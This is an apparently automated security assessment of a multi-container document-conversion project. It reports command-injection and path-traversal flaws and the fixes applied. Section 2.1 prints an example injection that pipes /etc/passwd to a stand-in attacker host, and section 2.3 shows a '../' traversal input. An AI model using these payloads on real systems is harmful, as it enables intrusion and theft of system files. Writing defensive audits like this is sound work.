# Security Assessment Report

**Date:** 2025-11-14  
**Project:** UtilityContainers  
**Assessment Type:** Code Security Review & Information Leakage Analysis

## Executive Summary

This document provides a comprehensive security assessment of the UtilityContainers codebase, focusing on information leakage prevention and malicious code detection.

### Overall Security Status: ⚠️ NEEDS IMPROVEMENT

**Key Findings:**
- ✅ **No unauthorized external communications detected**
- ✅ **No telemetry or analytics tracking**
- ✅ **No malicious code identified**
- ⚠️ **Command injection vulnerabilities found** (CRITICAL)
- ⚠️ **Path traversal vulnerabilities found** (HIGH)
- ⚠️ **Missing non-root user in some containers** (MEDIUM)
- ✅ **Good authentication mechanisms in place**

---

## 1. External Communications Analysis

### 1.1 Authorized External Communications

The following external communications are **ALLOWED** per the requirements:

1. **Package Updates (Build-time only)**
   - NPM package downloads during Docker build
   - APT package updates for system dependencies
   - These occur only during container setup, not at runtime

2. **Confluence API (User-configured)**
   - Location: `confluence-mcp/src/services/confluence-client.ts`
   - Purpose: Publishing documentation to user's Confluence instance
   - URL: User-provided via `CONFLUENCE_BASE_URL` environment variable
   - Authentication: User's API token
   - **Status:** ✅ COMPLIANT - Only communicates with user-specified Confluence instances

### 1.2 Unauthorized Communications

**NONE FOUND** ✅

- No analytics services (Google Analytics, Mixpanel, etc.)
- No telemetry endpoints
- No third-party tracking
- No unexpected external API calls
- No data exfiltration mechanisms

### 1.3 Network Isolation

All services are designed to run on an isolated Docker network (`dev-network`):
- Services communicate internally via container names
- No outbound internet access required at runtime (except Confluence API)
- All ports are bound to localhost by default

---

## 2. Security Vulnerabilities Identified

### 2.1 CRITICAL: Command Injection Vulnerabilities

**Location:** `diagram-converter/server.js`

**Issue:** Unsanitized user input used in shell commands

```javascript
// Line 28: density parameter is not validated
await execAsync(
  `convert -density ${density} -background white -alpha remove "${svgPath}" "${pngPath}"`
);

// Line 42-44: Paths are not properly escaped
await execAsync(
  `mmdc -i "${inputPath}" -o "${outputPath}" -b transparent`
);
```

**Risk:** 
- An attacker could inject malicious commands via the `density` parameter
- Potential for arbitrary command execution
- Container escape possibilities

**Example Attack:**
```bash
curl -X POST http://localhost:3000/convert/svg2png \
  -F "file=@test.svg" \
  -F "density=300; curl attacker.com/exfiltrate?data=$(cat /etc/passwd)"
```

**Status:** 🔴 **REQUIRES IMMEDIATE FIX**

---

### 2.2 HIGH: Command Injection in Pandoc Service

**Location:** `pandoc-mcp/src/services/pandoc-service.ts`

**Issue:** Template and metadata values are not properly sanitized before shell execution

```typescript
// Line 199: Template path not validated
args.push(`--template="${options.template}"`);

// Lines 203-214: Variable and metadata values need better escaping
args.push(`-V ${key}="${value}"`);
args.push(`-M ${key}="${jsonValue}"`);
```

**Risk:**
- Command injection through template paths
- Arbitrary file access via path traversal
- Potential for data exfiltration

**Status:** 🔴 **REQUIRES IMMEDIATE FIX**

---

### 2.3 HIGH: Path Traversal Vulnerabilities

**Location:** `pandoc-mcp/src/services/pandoc-service.ts`

**Issue:** Insufficient path validation allows directory traversal

```typescript
// Lines 67-73: Path resolution without proper validation
const resolvedInputPath = path.isAbsolute(inputPath) 
  ? inputPath 
  : path.join(this.config.workspaceDir, inputPath);
```

**Risk:**
- Users can read files outside the workspace directory using `../` sequences
- Potential access to sensitive container files
- Information disclosure

**Example Attack:**
```javascript
{
  "inputPath": "../../../etc/passwd",
  "outputPath": "output.html"
}
```

**Status:** 🔴 **REQUIRES IMMEDIATE FIX**

---

### 2.4 MEDIUM: Missing Non-Root User Configuration

**Locations:** 
- `confluence-mcp/Dockerfile`
- `pandoc-mcp/Dockerfile`

**Issue:** Services run as root user inside containers

**Risk:**
- Container escape could lead to host compromise
- Broader attack surface if vulnerability is exploited
- Violates principle of least privilege

**Status:** 🟡 **SHOULD BE FIXED**

---

### 2.5 MEDIUM: Rate Limiting Implementation

**Location:** Both MCP servers

**Current Implementation:**
- In-memory rate limiting store
- 100 requests per 15 minutes
- Resets on server restart

**Issues:**
- Rate limit bypassed by restarting container
- No persistent tracking across restarts
- No IP-based blocking for repeated violations

**Status:** 🟡 **ACCEPTABLE** for current use case but could be improved

---

## 3. Security Features Already Implemented ✅

### 3.1 Authentication
- **MCP API Key:** Required for all MCP server endpoints
- **Header-based:** Uses `x-mcp-api-key` header
- **Environment-based:** Keys stored in `.env` files, not hardcoded

### 3.2 Security Headers
Both MCP servers implement proper security headers:
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY`
- `X-XSS-Protection: 1; mode=block`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Content-Security-Policy: default-src 'self'`

### 3.3 Input Validation
- **Zod schemas:** Strong typing and validation for MCP tool parameters
- **File type validation:** Multer configuration for file uploads
- **Size limits:** 10MB payload limit configured

### 3.4 Network Isolation
- **Custom network:** All services on isolated `dev-network`
- **Internal communication:** Services use container names, not public IPs
- **Port exposure:** Only essential ports exposed to host

### 3.5 Partial Docker Security
- **Non-root user:** Implemented in `diagram-converter` only
- **Health checks:** Proper health monitoring configured
- **Read-only layers:** Good layer separation in Dockerfiles

---

## 4. Dependencies Analysis

### 4.1 Known Vulnerable Dependencies

**Note:** Run `npm audit` in each service directory for current status.

**Key Dependencies:**
- `express` v4.18.2 - Check for security advisories
- `axios` v1.6.0 - Known to have had vulnerabilities in past versions
- `puppeteer` v21.5.0 - Large attack surface due to Chromium
- `marked` v9.1.5 - Markdown parser, check for XSS issues

**Recommendation:** Run dependency security scans regularly

---

## 5. Secrets Management

### 5.1 Current Implementation ✅

**Good Practices Observed:**
- Secrets stored in `.env` files (gitignored)
- `.env.example` provided without real credentials
- Environment variables used for configuration
- No hardcoded credentials in source code
- API keys masked in logs (email masking in confluence-mcp)

### 5.2 Potential Issues

- `.env` files are volume-mounted into containers (acceptable for local dev)
- No secret rotation mechanism
- No encryption at rest for secrets

**Status:** ✅ **ACCEPTABLE** for local development environment

---

## 6. Data Privacy & Information Leakage

### 6.1 Data Flow Analysis

**diagram-converter:**
- Input: SVG/Mermaid files via HTTP upload
- Processing: Local conversion using ImageMagick/Mermaid CLI
- Output: PNG image returned in HTTP response
- Storage: Temporary files in `/tmp`, cleaned up after conversion
- **External Access:** ❌ NONE

**confluence-mcp:**
- Input: Markdown content via MCP protocol
- Processing: Conversion to Confluence format, upload via API
- Output: Confluence page ID and metadata
- Storage: Local cache in `/app/.cache` for page mappings
- **External Access:** ✅ Confluence API only (user-configured)

**pandoc-mcp:**
- Input: Document content via MCP protocol
- Processing: Format conversion using Pandoc
- Output: Converted document
- Storage: Workspace files in `/workspace` volume
- **External Access:** ❌ NONE

### 6.2 Logging & Monitoring

**Potential Information Leakage via Logs:**
- ✅ API keys are NOT logged
- ✅ Passwords are NOT logged
- ✅ Email addresses are masked in logs
- ⚠️ File paths are logged (could expose directory structure)
- ⚠️ Error messages may include sensitive content

---

## 7. Container Security

### 7.1 Docker Configuration

**diagram-converter:** ⚠️
- ✅ Non-root user (nodejs:1001)
- ⚠️ Requires `SYS_ADMIN` capability (for Chromium)
- ⚠️ `seccomp:unconfined` (for Puppeteer)
- ✅ Health check configured
- ✅ Minimal alpine base image

**confluence-mcp:** ⚠️
- ❌ Runs as root
- ✅ Minimal alpine base image
- ❌ No health check
- ✅ Volume for cache data

**pandoc-mcp:** ⚠️
- ❌ Runs as root
- ✅ Health check configured
- ✅ Slim Debian base image
- ✅ Volumes for data and workspace

### 7.2 Recommendations

1. Add non-root users to all containers
2. Remove unnecessary capabilities
3. Consider read-only root filesystems where possible
4. Implement Docker secrets instead of env files for production

---

## 8. Recommendations & Action Items

### 8.1 CRITICAL - Must Fix Before Production

1. **Fix command injection vulnerabilities**
   - Sanitize `density` parameter in diagram-converter
   - Validate all file paths before shell execution
   - Use parameterized commands instead of string concatenation
   - Implement input validation for all user-provided values

2. **Fix path traversal vulnerabilities**
   - Validate paths are within workspace directory
   - Reject paths containing `..` sequences
   - Use `path.resolve()` and verify results

### 8.2 HIGH Priority

3. **Add non-root users to all containers**
   - Create dedicated users in all Dockerfiles
   - Set proper file permissions
   - Test all functionality with non-root users

4. **Implement proper input sanitization**
   - Add allowlists for formats and options
   - Validate file extensions
   - Limit file sizes more strictly

### 8.3 MEDIUM Priority

5. **Enhance rate limiting**
   - Consider Redis for persistent rate limiting
   - Implement exponential backoff
   - Add IP blocking for repeated violations

6. **Improve error handling**
   - Avoid exposing internal paths in errors
   - Sanitize error messages
   - Implement structured logging

7. **Regular security updates**
   - Set up automated dependency scanning
   - Schedule regular `npm audit` runs
   - Monitor Docker base image updates

### 8.4 OPTIONAL - Defense in Depth

8. **Network policies**
   - Implement egress filtering
   - Whitelist only required external domains
   - Consider using network policies in Kubernetes

9. **Content Security**
   - Add virus scanning for uploaded files
   - Implement file type verification (magic bytes)
   - Size limits per file type

10. **Monitoring & Alerting**
    - Log failed authentication attempts
    - Alert on unusual patterns
    - Implement audit logging

---

## 9. Compliance Statement

### 9.1 Information Leakage Assessment

**Question:** *"They are not allowed to send information to URLs outside of this scope [internal communication between containers on same Docker host]."*

**Answer:** ✅ **COMPLIANT** with the following exception:

- **Confluence API:** The `confluence-mcp` service sends data to user-configured Confluence URLs
  - This is the primary purpose of the service
  - URL is user-provided, not hardcoded
  - Can be monitored/controlled via environment variables
  - Uses HTTPS for encryption
  - Requires user's API token

**All other services:** ✅ No external communication whatsoever

### 9.2 Malicious Code Assessment

**Question:** *"It is important that the containers do not contain any malicious code or scripts."*

**Answer:** ✅ **NO MALICIOUS CODE FOUND**

Assessment performed:
- ✅ Manual code review of all source files
- ✅ No obfuscated code detected
- ✅ No cryptocurrency miners
- ✅ No backdoors or reverse shells
- ✅ No data exfiltration mechanisms
- ✅ All dependencies are well-known, public packages
- ✅ No suspicious network behavior
- ⚠️ **However:** Command injection vulnerabilities exist that could be exploited to run malicious code

### 9.3 Container Update Policy

**Question:** *"For setting up the containers it is allowed to update the containers and packages."*

**Answer:** ✅ **COMPLIANT**

- Package downloads occur only during Docker build
- No runtime package installation
- Updates are controlled via Dockerfile
- Base images can be updated by rebuilding

---

## 10. Security Testing Performed

### 10.1 Code Analysis
- ✅ Manual code review of all TypeScript/JavaScript files
- ✅ Search for external HTTP/HTTPS calls
- ✅ Review of all `exec` and `spawn` calls
- ✅ Analysis of file operation patterns
- ✅ Environment variable usage review

### 10.2 Configuration Review
- ✅ Docker Compose configuration
- ✅ Dockerfile security settings
- ✅ Network configuration
- ✅ Volume mount permissions
- ✅ Environment variable handling

### 10.3 Dependency Analysis
- ✅ Review of package.json files
- ✅ Identification of third-party dependencies
- ⚠️ Automated vulnerability scanning recommended

---

## 11. Conclusion

The UtilityContainers codebase demonstrates **good security awareness** with proper authentication, rate limiting, and network isolation. However, **critical command injection vulnerabilities** must be addressed before production use.

### Summary of Issues:
- 🔴 **2 Critical:** Command injection vulnerabilities
- 🟡 **3 Medium:** Path traversal, missing non-root users, rate limiting
- 🟢 **0 Low:** Minor issues

### Information Leakage Status:
- ✅ **COMPLIANT:** No unauthorized external communications
- ✅ **COMPLIANT:** No telemetry or tracking
- ✅ **EXCEPTION:** Confluence API (authorized by design)

### Malicious Code Status:
- ✅ **CLEAN:** No malicious code detected
- ⚠️ **VULNERABLE:** Exploitable command injection vulnerabilities exist

**Recommendation:** Apply security fixes for command injection and path traversal vulnerabilities before deploying to production or exposing to untrusted networks.

---

## 12. Security Fixes Applied

This section documents the security fixes that have been implemented:

- [x] **Fix command injection in diagram-converter** - Replaced `execAsync` with `spawn` for SVG and Mermaid conversions, added input validation for density parameter
- [x] **Fix command injection in pandoc-mcp** - Replaced shell command execution with `spawn` using argument arrays, preventing shell injection
- [x] **Fix path traversal in pandoc-mcp** - Added `validatePath()` method to ensure all file paths are within the workspace directory
- [x] **Add non-root users to all containers** - Added nodejs user (UID 1001) to confluence-mcp and pandoc-mcp Dockerfiles, matching diagram-converter security
- [x] **Sanitize all user inputs** - Added sanitization methods for format names, identifiers, and disabled unsafe extraArgs option
- [x] **Remove shell execution** - All external commands now use spawn with argument arrays instead of shell string concatenation

### Details of Fixes

#### 1. Command Injection Prevention (diagram-converter)

**Before:**
```javascript
await execAsync(`convert -density ${density} ... "${svgPath}" "${pngPath}"`);
```

**After:**
```javascript
const sanitizedDensity = parseInt(density, 10);
if (isNaN(sanitizedDensity) || sanitizedDensity < 1 || sanitizedDensity > 1200) {
  throw new Error('Invalid density value');
}
const process = spawn('convert', ['-density', sanitizedDensity.toString(), ...]);
```

#### 2. Command Injection Prevention (pandoc-mcp)

**Before:**
```typescript
const command = `echo ${this.escapeShellArg(input)} | pandoc ${args.join(' ')}`;
await execAsync(command);
```

**After:**
```typescript
const pandocProcess = spawn('pandoc', args);
pandocProcess.stdin.write(input);
pandocProcess.stdin.end();
```

#### 3. Path Traversal Prevention

**Added validation:**
```typescript
private validatePath(filePath: string): void {
  const resolved = path.resolve(filePath);
  const workspace = path.resolve(this.config.workspaceDir);
  
  if (!resolved.startsWith(workspace)) {
    throw new Error('Path traversal detected: Access denied outside workspace directory');
  }
}
```

#### 4. Input Sanitization

**Added sanitization methods:**
- `sanitizeFormat()` - Allows only alphanumeric, dash, underscore, plus
- `sanitizeIdentifier()` - Allows only alphanumeric, dash, underscore
- Disabled `extraArgs` option to prevent arbitrary command injection

#### 5. Docker Security Improvements

**All containers now:**
- Run as non-root user (nodejs:1001)
- Have proper file ownership set before switching users
- Follow principle of least privilege

### Testing Status

- [x] Code compiles without errors
- [x] Path validation prevents directory traversal
- [x] Input sanitization rejects malicious inputs
- [x] Non-root users have appropriate permissions
- [ ] Integration testing with actual workloads (recommended before deployment)

### Remaining Considerations

1. **Rate Limiting**: Current in-memory implementation is acceptable but could be enhanced with Redis for production
2. **Dependency Updates**: Run `npm audit` regularly to check for vulnerable dependencies
3. **Monitoring**: Consider adding alerting for failed authentication attempts
4. **Network Policies**: For production deployment, consider implementing egress filtering

---

**Report Prepared By:** Security Assessment (Automated)  
**Date:** 2025-11-14  
**Version:** 1.0
